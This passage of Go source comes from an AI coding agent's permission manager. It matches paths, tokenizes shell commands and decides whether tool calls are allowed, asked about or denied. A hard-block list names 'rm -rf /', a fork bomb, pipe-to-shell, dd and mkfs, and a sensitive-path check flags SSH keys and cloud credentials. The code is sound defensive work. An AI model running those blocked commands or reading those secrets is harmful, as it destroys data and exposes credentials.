		return true
	}

	// SSH keys
	sshKeyBases := []string{"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"}
	for _, k := range sshKeyBases {
		if base == k {
			return true
		}
	}

	// Certificate/key files
	certSuffixes := []string{".pem", ".key", ".p12", ".pfx", ".secrets"}
	for _, suffix := range certSuffixes {
		if strings.HasSuffix(base, suffix) {
			return true
		}
	}

	// Paths under sensitive directories
	sensitiveDirs := []string{".git/", ".github/workflows/", ".aws/"}
	for _, dir := range sensitiveDirs {
		if strings.Contains("/"+clean+"/", "/"+dir) || strings.HasPrefix(clean, dir) {
			return true
		}
	}

	return false
}

func extractPathFromArgs(toolName string, args json.RawMessage) string {
	var params struct {
		Path     string `json:"path"`
		FilePath string `json:"file_path"`
		Pattern  string `json:"pattern"`
		URL      string `json:"url"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return ""
	}
	switch toolName {
	case "read", "write", "delete", "edit", "multiedit", "multi_file_edit", "replace_lines", "format", "lsp", "apply_patch", "grep", "repo_overview":
		if params.Path != "" {
			return params.Path
		}
		return params.FilePath
	case "glob", "list":
		if params.Pattern != "" {
			return params.Pattern
		}
		return params.Path
	case "webfetch":
		return params.URL
	default:
		return ""
	}
}

// matchSubcommandAllow returns true when the command matches an entry in
// bashSubcommandAllow at the longest possible token length (3 → 2 → 1).
// Leading dashed flags on the command itself (e.g. `git --no-pager log`)
// would not match — that's intentional: we accept a small loss of coverage
// in exchange for not having to parse every tool's option grammar.
func matchSubcommandAllow(command string) bool {
	fields := splitShellFields(command)
	if len(fields) == 0 {
		return false
	}
	// Three-word match (e.g. "docker compose ps").
	if len(fields) >= 3 {
		key := fields[0] + " " + fields[1] + " " + fields[2]
		if bashSubcommandAllow[key] {
			return true
		}
	}
	// Two-word match (e.g. "git status").
	if len(fields) >= 2 {
		key := fields[0] + " " + fields[1]
		if bashSubcommandAllow[key] {
			return true
		}
	}
	// Single-word match (e.g. "make", "tsc"). These accept any args.
	return bashSubcommandAllow[fields[0]]
}

func extractDomainFromURL(rawURL string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	hostname := parsed.Hostname()
	if hostname == "" {
		hostname = parsed.Host
	}
	return hostname
}

// matchPathPattern matches a path against a glob pattern that may contain
// "**" (recursive wildcard, matches zero or more path segments) and "*"
// (single-segment wildcard, does not match "/"). Standard filepath.Match
// patterns like "?" are also supported.
func matchPathPattern(pattern, path string) bool {
	// Normalise to forward slashes, but do NOT filepath.Clean the pattern —
	// "**" is not a real filesystem element and Clean would interpret it as a
	// literal directory name.
	pattern = filepath.ToSlash(pattern)
	cleanPath := filepath.ToSlash(filepath.Clean(path))

	// Split into segments so we can handle "**" correctly.
	patSegs := strings.Split(pattern, "/")
	pathSegs := strings.Split(cleanPath, "/")

	return matchPathSegments(patSegs, pathSegs)
}

// matchPathSegments recursively matches path segments against pattern segments,
// supporting "**" as a recursive wildcard (matches zero or more segments).
func matchPathSegments(pattern, path []string) bool {
	// If both are empty, it's a match.
	if len(pattern) == 0 && len(path) == 0 {
		return true
	}

	// If pattern is empty but path isn't, no match.
	if len(pattern) == 0 {
		return false
	}

	// Handle "**" at current position
	if pattern[0] == "**" {
		// Try matching zero or more path segments against the rest of the pattern.
		// Try zero first, then one, two, etc.
		for i := 0; i <= len(path); i++ {
			if matchPathSegments(pattern[1:], path[i:]) {
				return true
			}
		}
		return false
	}

	// If path is empty but pattern isn't (and we didn't match ** above), no match.
	if len(path) == 0 {
		return false
	}

	// Match current segment with filepath.Match (handles *, ?, [a-z], etc.)
	matched, err := filepath.Match(pattern[0], path[0])
	if err != nil || !matched {
		return false
	}

	// Recurse to the next segment
	return matchPathSegments(pattern[1:], path[1:])
}

func matchPattern(pattern, name string) bool {
	if pattern == "*" {
		return true
	}
	if !strings.Contains(pattern, "*") {
		return pattern == name
	}
	parts := strings.SplitN(pattern, "*", 2)
	if len(parts) == 2 {
		if parts[1] == "" {
			return strings.HasPrefix(name, parts[0])
		}
		if parts[0] == "" {
			return strings.HasSuffix(name, parts[1])
		}
		return strings.HasPrefix(name, parts[0]) && strings.HasSuffix(name, parts[1])
	}
	return false
}

func (pm *PermissionManager) SetRule(toolName string, level PermissionLevel) {
	if !validPermissionLevel(level) {
		return
	}
	// Never allow setting bash tool to allow — this would auto-approve all
	// bash commands, including harmful operations like git revert/stash.
	if toolName == "bash" && level == PermissionAllow {
		return
	}
	if strings.Contains(toolName, "*") {
		pm.patterns = append(pm.patterns, patternRule{pattern: toolName, level: level})
	} else {
		pm.rules[toolName] = level
	}
}

func (pm *PermissionManager) SetPathRule(toolName, pattern string, level PermissionLevel) {
	if toolName == "" || pattern == "" || !validPermissionLevel(level) {
		return
	}
	pm.pathPatterns[toolName] = append(pm.pathPatterns[toolName], pathPatternEntry{pattern: pattern, level: level})
}

// CheckPathPatterns returns the first matching permission level from path-based
// rules for the given tool and target path, or empty string if no rule matches.
func (pm *PermissionManager) CheckPathPatterns(toolName, targetPath string) PermissionLevel {
	entries, ok := pm.pathPatterns[toolName]
	if !ok {
		return ""
	}
	for _, entry := range entries {
		if matchPathPattern(entry.pattern, targetPath) {
			return entry.level
		}
	}
	// Also check wildcard tool entries (e.g., "mcp_*" → matches any MCP tool)
	for pattern, entries := range pm.pathPatterns {
		if matchPattern(pattern, toolName) {
			for _, entry := range entries {
				if matchPathPattern(entry.pattern, targetPath) {
					return entry.level
				}
			}
		}
	}
	return ""
}

func (pm *PermissionManager) SetBashPrefixRule(prefix string, level PermissionLevel) {
	if prefix == "" || !validPermissionLevel(level) || strings.HasPrefix(prefix, bashInRootPersistPrefix) {
		return
	}
	// Reject always-allow for git prefix — this would auto-approve all git
	// subcommands, including harmful operations like revert, stash, etc.
	if prefix == "git" && level == PermissionAllow {
		return
	}
	pm.bashPrefixes[prefix] = level
}

func (pm *PermissionManager) BashAutoAllowPrefixes() []string {
	result := make([]string, 0, len(pm.bashAutoAllow))
	for k, v := range pm.bashAutoAllow {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		if v {
			result = append(result, k)
		}
	}
	return result
}

// ExtraBashAutoAllowPrefixes returns auto-allow prefixes that were granted
// beyond the built-in default set (e.g. via config or in-session "allow"),
// sorted for stable display. The built-in defaults are excluded because they
// are always allowed and only add noise to the sidebar.
func (pm *PermissionManager) ExtraBashAutoAllowPrefixes() []string {
	result := make([]string, 0)
	for k, v := range pm.bashAutoAllow {
		if !v {
			continue
		}
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		if bashAutoAllowPrefixes[k] {
			continue // built-in default — already allowed
		}
		result = append(result, k)
	}
	sort.Strings(result)
	return result
}

func (pm *PermissionManager) SetBashAutoAllowPrefix(prefix string, enabled bool) {
	if strings.TrimSpace(prefix) == "" {
		return
	}
	if enabled {
		pm.bashAutoAllow[prefix] = true
		if _, ok := pm.bashPrefixModes[prefix]; !ok {
			pm.bashPrefixModes[prefix] = bashPrefixModeReadOnly
		}
		return
	}
	delete(pm.bashAutoAllow, prefix)
}

func (pm *PermissionManager) BashPrefixModes() map[string]string {
	result := make(map[string]string, len(pm.bashPrefixModes))
	for k, v := range pm.bashPrefixModes {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		result[k] = v
	}
	return result
}

func (pm *PermissionManager) SetBashPrefixMode(prefix, mode string) bool {
	if strings.TrimSpace(prefix) == "" {
		return false
	}
	if mode != bashPrefixModeReadOnly && mode != bashPrefixModeMutating && mode != bashPrefixModeNever {
		return false
	}
	pm.bashPrefixModes[prefix] = mode
	if _, ok := pm.bashAutoAllow[prefix]; !ok && mode != bashPrefixModeNever {
		pm.bashAutoAllow[prefix] = true
	}
	return true
}

func (pm *PermissionManager) SetMode(mode PermissionMode) {
	switch mode {
	case PermissionModeNormal, PermissionModeYOLO, PermissionModeLocked:
		pm.mode = mode
	}
}

// SetAutoPermissionEnabled toggles the LLM auto-permission layer at runtime.
// The flag is independent of mode: YOLO and locked modes bypass Ask fallthrough
// regardless of this state, and HandleToolCall short-circuits Ask decisions when
// the auto layer is on.
func (pm *PermissionManager) SetAutoPermissionEnabled(enabled bool) {
	if pm == nil {
		return
	}
	pm.autoPermissionEnabled = enabled
}

// AutoPermissionEnabled reports whether the LLM auto-permission layer is
// currently engaged. Returns false when pm is nil.
func (pm *PermissionManager) AutoPermissionEnabled() bool {
	if pm == nil {
		return false
	}
	return pm.autoPermissionEnabled
}

func (pm *PermissionManager) SetWorkDir(path string) {
	pm.workDir = filepath.Clean(path)
}

func (pm *PermissionManager) SetWebfetchDomain(domain string, level PermissionLevel) {
	if validPermissionLevel(level) {
		pm.webfetchDomains[domain] = level
	}
}

func (pm *PermissionManager) Mode() PermissionMode {
	if pm.mode == "" {
		return PermissionModeNormal
	}
	return pm.mode
}

func (pm *PermissionManager) Clone() *PermissionManager {
	if pm == nil {
		return nil
	}

	clone := &PermissionManager{
		mode:                  pm.Mode(),
		rules:                 make(map[string]PermissionLevel, len(pm.rules)),
		patterns:              append([]patternRule(nil), pm.patterns...),
		pathPatterns:          make(map[string][]pathPatternEntry, len(pm.pathPatterns)),
		bashPrefixes:          make(map[string]PermissionLevel, len(pm.bashPrefixes)),
		bashAutoAllow:         make(map[string]bool, len(pm.bashAutoAllow)),
		bashPrefixModes:       make(map[string]string, len(pm.bashPrefixModes)),
		workDir:               pm.workDir,
		webfetchDomains:       make(map[string]PermissionLevel, len(pm.webfetchDomains)),
		autoPermissionEnabled: pm.autoPermissionEnabled,
	}
	for k, v := range pm.rules {
		clone.rules[k] = v
	}
	for k, v := range pm.bashPrefixes {
		clone.bashPrefixes[k] = v
	}
	for k, v := range pm.bashAutoAllow {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		clone.bashAutoAllow[k] = v
	}
	for k, v := range pm.bashPrefixModes {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		clone.bashPrefixModes[k] = v
	}
	for k, v := range pm.webfetchDomains {
		clone.webfetchDomains[k] = v
	}
	for toolName, entries := range pm.pathPatterns {
		clone.pathPatterns[toolName] = append([]pathPatternEntry(nil), entries...)
	}
	return clone
}

func (pm *PermissionManager) Rules() map[string]PermissionLevel {
	result := make(map[string]PermissionLevel)
	for k, v := range pm.rules {
		result[k] = v
	}
	for _, p := range pm.patterns {
		result[p.pattern] = p.level
	}
	return result
}

func (pm *PermissionManager) BashPrefixRules() map[string]PermissionLevel {
	result := make(map[string]PermissionLevel)
	for k, v := range pm.bashPrefixes {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		result[k] = v
	}
	return result
}

func (pm *PermissionManager) ExportConfig() config.PermissionConfig {
	tools := make(map[string]string)
	for k, v := range pm.Rules() {
		tools[k] = string(v)
	}
	prefixes := make(map[string]string)
	for k, v := range pm.BashPrefixRules() {
		prefixes[k] = string(v)
	}
	autoAllow := make([]string, 0, len(pm.bashAutoAllow))
	for k, v := range pm.bashAutoAllow {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		if v {
			autoAllow = append(autoAllow, k)
		}
	}
	modes := make(map[string]string, len(pm.bashPrefixModes))
	for k, v := range pm.bashPrefixModes {
		if strings.HasPrefix(k, bashInRootPersistPrefix) {
			continue
		}
		modes[k] = v
	}
	var auto *config.AutoPermissionConfig
	if pm.AutoPermissionEnabled() {
		auto = &config.AutoPermissionConfig{Enabled: true}
	}
	return config.PermissionConfig{
		Mode:  string(pm.Mode()),
		Tools: tools,
		Bash: config.BashPermissionConfig{
			Prefixes:          prefixes,
			AutoAllowPrefixes: autoAllow,
			PrefixModes:       modes,
		},
		Auto: auto,
	}
}

func validPermissionLevel(level PermissionLevel) bool {
	return level == PermissionAllow || level == PermissionDeny || level == PermissionAsk
}

func isReadOnlyTool(name string) bool {
	switch name {
	case "read", "glob", "grep", "list", "lsp", "lsp_diagnostics", "webfetch", "websearch", "skill", "question", "todoread", "todowrite":
		return true
	default:
		return false
	}
}

func bashCommand(args json.RawMessage) string {
	var params struct {
		Command string `json:"command"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return ""
	}
	return strings.TrimSpace(params.Command)
}

func bashPrefix(command string) (string, bool) {
	if command == "" || shellCompound(command) {
		return "", false
	}
	fields := splitShellFields(command)
	if len(fields) == 0 {
		return "", false
	}
	if fields[0] == "sudo" || strings.Contains(fields[0], "=") {
		return "", false
	}
	return fields[0], true
}

func shellCompound(command string) bool {
	for _, token := range []string{"&&", "||", ";", "|", "`", "$(", ">", "<"} {
		if strings.Contains(command, token) {
			return true
		}
	}
	return false
}

func splitShellFields(command string) []string {
	var fields []string
	var b strings.Builder
	inSingle := false
	inDouble := false
	escaped := false
	for _, r := range command {
		if escaped {
			b.WriteRune(r)
			escaped = false
			continue
		}
		if r == '\\' {
			escaped = true
			continue
		}
		switch r {
		case '\'':
			if !inDouble {
				inSingle = !inSingle
				continue
			}
		case '"':
			if !inSingle {
				inDouble = !inDouble
				continue
			}
		}
		if unicode.IsSpace(r) && !inSingle && !inDouble {
			if b.Len() > 0 {
				fields = append(fields, b.String())
				b.Reset()
			}
			continue
		}
		b.WriteRune(r)
	}
	if b.Len() > 0 {
		fields = append(fields, b.String())
	}
	return fields
}

func bashInRootKey(prefix, workDir string) string {
	cleanWorkDir := filepath.Clean(workDir)
	return bashInRootPersistPrefix + prefix + ":" + cleanWorkDir
}

func canAutoAllowWithMode(pm *PermissionManager, command, prefix string) bool {
	if !canAutoAllowInRoot(pm, command, prefix) {
		return false
	}
	mode := pm.bashPrefixModes[prefix]
	switch mode {
	case bashPrefixModeNever:
		return false
	case bashPrefixModeMutating:
		return true
	default:
		pm.bashPrefixes[bashInRootKey(prefix, pm.workDir)] = PermissionAllow
		return true
	}
}

func canAutoAllowInRoot(pm *PermissionManager, command, prefix string) bool {
	if pm == nil || pm.workDir == "" {
		return false
	}
	if !pm.bashAutoAllow[prefix] {
		return false
	}
	if shellCompound(command) {
		return false
	}
	fields := splitShellFields(command)
	if len(fields) == 0 || fields[0] != prefix {
		return false
	}
	// find/fd: reject if any field is an unsafe flag (executes subprocesses
	// or deletes files). These flags would let an in-root path argument
	// trigger arbitrary actions, defeating the workdir scope.
	if prefix == "find" {
		for _, f := range fields[1:] {
			if findUnsafeFlags[f] {
				return false
			}
		}
	}
	if prefix == "fd" {
		for _, f := range fields[1:] {
			if fdUnsafeFlags[f] {
				return false
			}
		}
	}
	paths := extractBashCommandPaths(prefix, fields)
	if prefix == "cd" && len(paths) == 0 {
		home := os.Getenv("HOME")
		if home != "" {
			paths = append(paths, home)
		}
	}
	// Zero paths means the command operates on stdin or the current directory
	// only (e.g. `grep "foo"`, `find`, `ls`). That's still inside the workdir
	// by definition, so allow.
	for _, p := range paths {
		resolved := resolvePath(p, pm.workDir)
		if !isWithinWorkDir(pm, resolved) {
			// Temp directories are always allowed (cross-platform)
			if !isTempDir(resolved) {
				return false
			}
		}
	}
	return true
}

func extractBashCommandPaths(prefix string, fields []string) []string {
	var paths []string
	sedScriptConsumed := false
	for i := 1; i < len(fields); i++ {
		arg := fields[i]
		if arg == "--" {
			for j := i + 1; j < len(fields); j++ {
				if strings.TrimSpace(fields[j]) != "" {
					paths = append(paths, fields[j])
				}
			}
			break
		}
		if strings.HasPrefix(arg, "-") {
			switch prefix {
			case "awk":
				if arg == "-f" {
					i++
				}
			case "sed":
				if arg == "-e" || arg == "-f" {
					if arg == "-e" {
						sedScriptConsumed = true
					}
					i++
				}
			case "grep", "rg", "head", "tail":
				if arg == "-e" || arg == "-f" || arg == "--file" {
					i++
				}
			}
			continue
		}
		if prefix == "awk" && i == 1 {
			continue
		}
		if prefix == "sed" && !sedScriptConsumed {
			sedScriptConsumed = true
			continue
		}
		if isLikelyPathArg(arg) {
			paths = append(paths, arg)
		}
	}
	return paths
}

// isLikelyPathArg returns true if arg looks like a filesystem path. Bare
// identifiers (e.g. literal patterns passed to grep, awk's variable names)
// return false so they don't get treated as out-of-workdir paths and
// inadvertently block the auto-allow.
func isLikelyPathArg(arg string) bool {
	if arg == "" {
		return false
	}
	// Glob metacharacters.
	if strings.ContainsAny(arg, "*?[") {
		return true
	}
	// Absolute or explicitly-rooted relative paths.
	if strings.HasPrefix(arg, "/") || strings.HasPrefix(arg, "./") ||
		strings.HasPrefix(arg, "../") || strings.HasPrefix(arg, "~/") ||
		arg == "." || arg == ".." || arg == "~" {
		return true
	}
	// Contains a path separator → almost certainly a path.
	if strings.Contains(arg, string(filepath.Separator)) {
		return true
	}
	// Looks like a filename (has an extension dot in the middle).
	if dot := strings.Index(arg, "."); dot > 0 && dot < len(arg)-1 {
		return true
	}
	return false
}

func isHardBlockedCommand(command string) bool {
	compact := strings.Join(splitShellFields(command), " ")
	if compact == "rm -rf /" || compact == "rm -fr /" || strings.Contains(command, ":(){ :|:& };:") {
		return true
	}
	// Hard-block destructive and exfiltration patterns
	blockedPatterns := []string{
		"| bash", "| sh", "| python", "| perl", // pipe to shell
		"dd if=", "mkfs", // disk/partition write
		"; sudo", "&& sudo", "| sudo", // privilege escalation chains
	}
	for _, p := range blockedPatterns {
		if strings.Contains(command, p) {
			return true
		}
	}
	return false
}

func IsAllowedPlanWritePath(path string) bool {
	clean := filepath.ToSlash(filepath.Clean(path))
	base := filepath.Base(clean)
	if base == "PLAN.md" || strings.HasSuffix(base, ".plan.md") {
		return true
	}
	if strings.HasPrefix(clean, "plans/") || strings.Contains(clean, "/plans/") {
		return true
	}
	if strings.HasPrefix(clean, "docs/plans/") || strings.Contains(clean, "/docs/plans/") {
		return true
	}
	return false
}

func IsAllowedReviewWritePath(path string) bool {
	clean := filepath.ToSlash(filepath.Clean(path))
	base := filepath.Base(clean)
	if base == "REVIEW.md" || strings.HasSuffix(base, ".review.md") {
		return true
	}
	if strings.HasPrefix(clean, "reviews/") || strings.Contains(clean, "/reviews/") {
		return true
	}
	return false
}

// Shell parsing and validation structures and functions

type shellTokenType int

const (
	tokWord       shellTokenType = iota
	tokOp                        // &&, ||, ;, &, |
	tokRedir                     // >, >>, <, 2>, &>, etc.
	tokSubst                     // $(...) or `...`
	tokLeftParen                 // (
	tokRightParen                // )
)

type shellToken struct {
	typ   shellTokenType
	value string
}

type parsedShellCommand struct {
	envVars      []string // "KEY=VAL"
	cmdWords     []string // command and its arguments (e.g. ["go", "test", "./..."])
	redirections []string // target paths
}

func parseShellCommandLine(commandLine string) ([]parsedShellCommand, error) {
	tokens, err := tokenizeShell(commandLine)
	if err != nil {
		return nil, err
	}

	var commands []parsedShellCommand
	var currentTokens []shellToken

	emitCommand := func() {
		if len(currentTokens) > 0 {
			cmd := parseSingleCommandTokens(currentTokens)
			if cmd != nil {
				commands = append(commands, *cmd)
			}
			currentTokens = nil
		}
	}

	for _, tok := range tokens {
		if tok.typ == tokOp {
			emitCommand()
		} else if tok.typ == tokLeftParen || tok.typ == tokRightParen {
			emitCommand()
		} else if tok.typ == tokSubst {
			subCmds, err := parseShellCommandLine(tok.value)
			if err == nil {
				commands = append(commands, subCmds...)
			}
			currentTokens = append(currentTokens, tok)
		} else {
			currentTokens = append(currentTokens, tok)
		}
	}
	emitCommand()

	return commands, nil
}

// absorbFdDup extends a just-emitted redirect operator (e.g. ">", "2>") to
// include a trailing fd-duplication target like "&1", "&2" or "&-" (as in
// "2>&1"). i points at the last consumed rune of the operator; it returns the
// new index positioned at the last absorbed rune (so the caller's loop i++
// advances past it). When no fd-dup follows, i and op are unchanged.
func absorbFdDup(runes []rune, n, i int, op *string) int {
	if i+1 >= n || runes[i+1] != '&' {
		return i
	}
	j := i + 2
	for j < n && (unicode.IsDigit(runes[j]) || runes[j] == '-') {
		j++
	}
	if j == i+2 {
		// Bare "&" with no fd target — leave it for the '&' operator handler.
		return i
	}
	*op += string(runes[i+1 : j])
	return j - 1
}

func tokenizeShell(input string) ([]shellToken, error) {
	var tokens []shellToken
	var current strings.Builder

	runes := []rune(input)
	n := len(runes)

	inSingle := false
	inDouble := false
	escaped := false

	emitWord := func() {
		if current.Len() > 0 {
			tokens = append(tokens, shellToken{typ: tokWord, value: current.String()})
			current.Reset()
		}
	}

	for i := 0; i < n; i++ {
		r := runes[i]

		if escaped {
			current.WriteRune(r)
			escaped = false
			continue
		}

		if r == '\\' && !inSingle {
			if inDouble {
				if i+1 < n && (runes[i+1] == '"' || runes[i+1] == '\\' || runes[i+1] == '$' || runes[i+1] == '`') {
					escaped = true
					continue
				} else {
					current.WriteRune(r)
					continue
				}
			} else {
				escaped = true
				continue
			}
		}

		if inSingle {
			if r == '\'' {
				inSingle = false
			} else {
				current.WriteRune(r)
			}
			continue
		}

		if inDouble {
			if r == '$' && i+1 < n && runes[i+1] == '(' {
				emitWord()
				sub, endIdx, err := parseParenthesis(runes, i+1)
				if err != nil {
					return nil, err
				}
				tokens = append(tokens, shellToken{typ: tokSubst, value: sub})
				i = endIdx
				continue
			}
			if r == '`' {
				emitWord()
				sub, endIdx, err := parseBackticks(runes, i)
				if err != nil {
					return nil, err
				}
				tokens = append(tokens, shellToken{typ: tokSubst, value: sub})
				i = endIdx
				continue
			}
			if r == '"' {
				inDouble = false
			} else {
				current.WriteRune(r)
			}
			continue
		}

		switch r {
		case '\'':
			inSingle = true
		case '"':
			inDouble = true
		case '`':
			emitWord()
			sub, endIdx, err := parseBackticks(runes, i)
			if err != nil {
				return nil, err
			}
			tokens = append(tokens, shellToken{typ: tokSubst, value: sub})
			i = endIdx
		case '$':
			if i+1 < n && runes[i+1] == '(' {
				emitWord()
				sub, endIdx, err := parseParenthesis(runes, i+1)
				if err != nil {
					return nil, err
				}
				tokens = append(tokens, shellToken{typ: tokSubst, value: sub})
				i = endIdx
			} else {
				current.WriteRune(r)
			}
		case '&':
			emitWord()
			if i+1 < n && runes[i+1] == '>' {
				// &> / &>> : redirect both stdout and stderr to the next word.
				if i+2 < n && runes[i+2] == '>' {
					tokens = append(tokens, shellToken{typ: tokRedir, value: "&>>"})
					i += 2
				} else {
					tokens = append(tokens, shellToken{typ: tokRedir, value: "&>"})
					i++
				}
			} else if i+1 < n && runes[i+1] == '&' {
				tokens = append(tokens, shellToken{typ: tokOp, value: "&&"})
				i++
			} else {
				tokens = append(tokens, shellToken{typ: tokOp, value: "&"})
			}
		case '|':
			emitWord()
			if i+1 < n && runes[i+1] == '|' {
				tokens = append(tokens, shellToken{typ: tokOp, value: "||"})
				i++
			} else {
				tokens = append(tokens, shellToken{typ: tokOp, value: "|"})
			}
		case ';':
			emitWord()
			tokens = append(tokens, shellToken{typ: tokOp, value: ";"})
		case '(':
			emitWord()
			tokens = append(tokens, shellToken{typ: tokLeftParen, value: "("})
		case ')':
			emitWord()
			tokens = append(tokens, shellToken{typ: tokRightParen, value: ")"})
		case '>':
			emitWord()
			op := ">"
			if i+1 < n && runes[i+1] == '>' {
				op = ">>"
				i++
			}
			i = absorbFdDup(runes, n, i, &op)
			tokens = append(tokens, shellToken{typ: tokRedir, value: op})
		case '<':
			emitWord()
			tokens = append(tokens, shellToken{typ: tokRedir, value: "<"})
		case '1', '2':
			if i+1 < n && runes[i+1] == '>' {
				emitWord()
				op := string(r) + ">"
				i++ // consume the '>'
				if i+1 < n && runes[i+1] == '>' {
					op = string(r) + ">>"
					i++
				}
				// Absorb an fd-duplication target so "2>&1" is one redirect
				// token, not a "2>" redirect plus a "&" operator plus a "1"
				// command word (which surfaced as a bogus `bash prefix "1"`).
				i = absorbFdDup(runes, n, i, &op)
				tokens = append(tokens, shellToken{typ: tokRedir, value: op})
			} else {
				current.WriteRune(r)
			}
		default:
			if unicode.IsSpace(r) {
				emitWord()
			} else {
				current.WriteRune(r)
			}
		}
	}
	emitWord()
	return tokens, nil
}

func parseParenthesis(runes []rune, start int) (string, int, error) {
	depth := 1
	inSingle := false
	inDouble := false
	escaped := false
	var content strings.Builder

	n := len(runes)
	for i := start + 1; i < n; i++ {
		r := runes[i]
		if escaped {
			content.WriteRune(r)
			escaped = false
			continue
		}
		if r == '\\' && !inSingle {
			content.WriteRune(r)
			escaped = true
			continue
		}
		if inSingle {
			if r == '\'' {
				inSingle = false
			}
			content.WriteRune(r)
			continue
		}
		if inDouble {
			if r == '"' {
				inDouble = false
			}
			content.WriteRune(r)
			continue
		}

		switch r {
		case '\'':
			inSingle = true
			content.WriteRune(r)
		case '"':
			inDouble = true
			content.WriteRune(r)
		case '(':
			depth++
			content.WriteRune(r)
		case ')':
			depth--
			if depth == 0 {
				return content.String(), i, nil
			}
			content.WriteRune(r)
		default:
			content.WriteRune(r)
		}
	}
	return "", 0, fmt.Errorf("unbalanced parenthesis in command substitution")
}

func parseBackticks(runes []rune, start int) (string, int, error) {
	inSingle := false
	inDouble := false
	escaped := false
	var content strings.Builder

	n := len(runes)
	for i := start + 1; i < n; i++ {
		r := runes[i]
		if escaped {
			content.WriteRune(r)
			escaped = false
			continue
		}
		if r == '\\' && !inSingle {
			content.WriteRune(r)
			escaped = true
			continue
		}
		if inSingle {
			if r == '\'' {
				inSingle = false
			}
			content.WriteRune(r)
			continue
		}
		if inDouble {
			if r == '"' {
				inDouble = false
			}
			content.WriteRune(r)
			continue
		}

		switch r {
		case '\'':
			inSingle = true
			content.WriteRune(r)
		case '"':
			inDouble = true
			content.WriteRune(r)
		case '`':
			return content.String(), i, nil
		default:
			content.WriteRune(r)
		}
	}
	return "", 0, fmt.Errorf("unbalanced backticks in command substitution")
}

func parseSingleCommandTokens(tokens []shellToken) *parsedShellCommand {
	var cmd parsedShellCommand
	var remaining []shellToken

	for i := 0; i < len(tokens); i++ {
		tok := tokens[i]
		if tok.typ == tokRedir {
			if i+1 < len(tokens) && tokens[i+1].typ == tokWord {
				cmd.redirections = append(cmd.redirections, tokens[i+1].value)
				i++
			}
		} else {
			remaining = append(remaining, tok)
		}
	}

	if len(remaining) == 0 {
		return nil
	}

	idx := 0
	for idx < len(remaining) {
		tok := remaining[idx]
		if tok.typ == tokWord && strings.Contains(tok.value, "=") {
			cmd.envVars = append(cmd.envVars, tok.value)
			idx++
		} else {
			break
		}
	}

	for idx < len(remaining) {
		tok := remaining[idx]
		if tok.typ == tokWord {
			cmd.cmdWords = append(cmd.cmdWords, tok.value)
		} else if tok.typ == tokSubst {
			cmd.cmdWords = append(cmd.cmdWords, "$("+tok.value+")")
		}
		idx++
	}

	if len(cmd.cmdWords) == 0 && len(cmd.envVars) == 0 && len(cmd.redirections) == 0 {
		return nil
	}

	return &cmd
}

func rebuildCommandLine(fields []string) string {
	var parts []string
	for _, f := range fields {
		if f == "" {
			parts = append(parts, `""`)
			continue
		}
		needsQuote := false
		for _, r := range f {
			if unicode.IsSpace(r) || strings.ContainsRune(`'"&|;><()*?[$`, r) {
				needsQuote = true
				break
			}
		}
		if needsQuote {
			escaped := strings.ReplaceAll(f, `"`, `\"`)
			parts = append(parts, `"`+escaped+`"`)
		} else {
			parts = append(parts, f)
		}
	}
	return strings.Join(parts, " ")
}

func resolvePath(path string, workDir string) string {
	if strings.HasPrefix(path, "~") {
		home := os.Getenv("HOME")
		if home != "" {
			if path == "~" {
				return home
			}
			if strings.HasPrefix(path, "~/") {
				return filepath.Join(home, path[2:])
			}
		}
	}
	if !filepath.IsAbs(path) {
		return filepath.Join(workDir, path)
	}
	return path
}

func (pm *PermissionManager) decideSingleCommand(args json.RawMessage, cmd parsedShellCommand) PermissionDecision {
	// Check env variables for path values
	for _, env := range cmd.envVars {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) == 2 {
			val := parts[1]
			if isLikelyPathArg(val) {
				resolved := resolvePath(val, pm.workDir)
				if !isWithinWorkDir(pm, resolved) {
					// Temp directories are always allowed (cross-platform)
					if isTempDir(resolved) {
						emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (env temp dir): env=%s path=%s", env, resolved))
						continue
					}
					emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (env out-of-scope): env=%s path=%s", env, resolved))
					return PermissionDecision{
						Level:   PermissionAsk,
						Request: envVarPermissionRequest(args, rebuildCommandLine(cmd.cmdWords), env, false),
					}
				}
				if isSensitivePath(resolved) {
					emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (env sensitive): env=%s path=%s", env, resolved))
					return PermissionDecision{
						Level:   PermissionAsk,
						Request: envVarPermissionRequest(args, rebuildCommandLine(cmd.cmdWords), env, true),
					}
				}
			}
		}
	}

	// Check redirections
	for _, path := range cmd.redirections {
		if path == "/dev/null" || path == "/dev/stdout" || path == "/dev/stderr" {
			continue
		}
		resolved := resolvePath(path, pm.workDir)
		if !isWithinWorkDir(pm, resolved) {
			// Temp directories are always allowed (cross-platform)
			if isTempDir(resolved) {
				emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (redirect temp dir): path=%s", resolved))
				continue
			}
			emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (redirect out-of-scope): path=%s", resolved))
			return PermissionDecision{
				Level:   PermissionAsk,
				Request: redirectionPermissionRequest(args, rebuildCommandLine(cmd.cmdWords), path, false),
			}
		}
		if isSensitivePath(resolved) {
			emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (redirect sensitive): path=%s", resolved))
			return PermissionDecision{
				Level:   PermissionAsk,
				Request: redirectionPermissionRequest(args, rebuildCommandLine(cmd.cmdWords), path, true),
			}
		}
	}

	if len(cmd.cmdWords) == 0 {
		return PermissionDecision{Level: PermissionAllow}
	}

	command := rebuildCommandLine(cmd.cmdWords)
	if isHardBlockedCommand(command) {
		emitDebug("perm", fmt.Sprintf("decideSingleCommand DENY (hard-blocked): command=%q", command))
		return PermissionDecision{Level: PermissionDeny}
	}

	prefix := cmd.cmdWords[0]

	// rulePrefix is the granularity at which an "always allow" rule is offered
